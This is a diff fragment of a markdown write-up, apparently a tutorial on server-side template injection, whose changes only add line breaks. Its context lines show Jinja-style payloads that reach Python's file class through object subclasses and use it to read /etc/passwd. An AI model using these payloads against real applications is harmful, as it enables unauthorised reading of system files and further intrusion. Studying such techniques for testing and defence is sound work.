@@ -489,6 +489,8 @@ As example ->
 
 * Base on that he created payload like ->
 
+<br>
+
 ```
 {{[].__class__.__base__.__subclasses__().pop(40) }}
 
@@ -502,6 +504,7 @@ That payload gave  object of **"file"**
 <br>
 
 * Now for read "/etc/passwd" ->
+<br>
 
 ```
 {{[].__class__.__base__.__subclasses__().pop(40)('etc/passwd').read() }}
